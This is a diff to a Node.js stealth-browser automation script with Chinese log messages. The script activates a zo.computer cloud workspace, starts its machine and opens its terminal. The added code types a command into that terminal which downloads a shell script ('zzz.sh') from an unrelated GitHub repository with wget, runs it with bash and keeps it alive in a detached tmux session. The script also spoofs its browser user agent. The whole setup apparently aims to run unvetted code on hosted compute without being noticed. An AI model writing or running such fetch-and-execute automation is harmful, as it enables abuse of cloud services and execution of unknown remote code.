@@ -3,8 +3,11 @@ import { launch } from 'cloakbrowser';
 const CONFIG = {
   workspaceDomain: 'ttt0090.zo.computer',
   workspaceName: 'ttt0090',
-  waitAfterEnterWorkspace: 60000,
+  waitAfterEnterWorkspace: 90000,
+  waitAfterStartMachine: 30000,
   headless: true,
+  runTmuxInit: process.env.INIT_TMUX === '1',
+  tmuxCommand: "su - ttt0090 -c 'tmux has-session -t main 2>/dev/null || tmux new-session -d -s main; tmux send-keys -t main \"cd \\$HOME && wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && bash zzz.sh\" C-m'",
 };
 
 async function isVisible(locator, timeout = 3000) {
@@ -22,6 +25,7 @@ async function clickSafely(locator, name) {
 }
 
 async function selectWorkspaceIfNeeded(page) {
+  console.log('🔎 检查是否出现工作区选择页面...');
   const domainText = page.getByText(CONFIG.workspaceDomain, { exact: false });
   const nameText = page.getByText(CONFIG.workspaceName, { exact: false });
   
@@ -40,43 +44,55 @@ async function selectWorkspaceIfNeeded(page) {
 
 async function clickStartButtonIfExists(page) {
   const startButton = page.locator('text=Start machine').or(page.locator('text=Run')).or(page.locator('text=开始')).first();
-  if (await isVisible(startButton, 8000)) {
-    await startButton.click();
+  if (await isVisible(startButton, 10000)) {
+    await clickSafely(startButton, 'Start machine / Run');
     await page.waitForTimeout(10000);
     return true;
   }
   return false;
 }
 
+async function openTerminalAndRunTmux(page) {
+  if (!CONFIG.runTmuxInit) return;
+  console.log('🖥️ 执行 tmux 初始化...');
+  await page.keyboard.press('Control+Shift+`');
+  await page.waitForTimeout(5000);
+  await page.keyboard.insertText(CONFIG.tmuxCommand);
+  await page.keyboard.press('Enter');
+  await page.waitForTimeout(10000);
+  await safeScreenshot(page, 'after-tmux-command.png');
+}
+
 async function run() {
   const activationUrl = process.argv[2];
   if (!activationUrl) { console.error('❌ 没有传入激活链接'); process.exit(1); }
 
-  console.log('🚀 启动 CloakBrowser...');
+  console.log('🚀 启动 CloakBrowser 执行激活...');
+  
+  // --- 关键修改：调用 launch ---
   const browser = await launch({ headless: CONFIG.headless });
   const context = await browser.newContext({
-    viewport: { width: 390, height: 844 },
-    userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    viewport: { width: 1280, height: 900 },
+    userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
   });
   const page = await context.newPage();
 
   try {
-    console.log('🌐 打开激活链接...');
     await page.goto(activationUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
-    await page.waitForTimeout(5000);
     await safeScreenshot(page, 'activate-open.png');
 
     const selectedWorkspace = await selectWorkspaceIfNeeded(page);
     if (selectedWorkspace) {
       await page.waitForTimeout(CONFIG.waitAfterEnterWorkspace);
       await clickStartButtonIfExists(page);
-      await safeScreenshot(page, 'result.png');
-      console.log('✅ 激活流程完成');
+      await page.waitForTimeout(CONFIG.waitAfterStartMachine);
+      await openTerminalAndRunTmux(page);
     } else {
       await clickStartButtonIfExists(page);
-      await safeScreenshot(page, 'result.png');
-      console.log('✅ 脚本结束');
+      if (CONFIG.runTmuxInit) await openTerminalAndRunTmux(page);
     }
+    await safeScreenshot(page, 'result.png');
+    console.log('✅ 激活流程完成');
   } catch (err) {
     console.error('❌ 激活失败:', err);
     await safeScreenshot(page, 'activate-error.png');
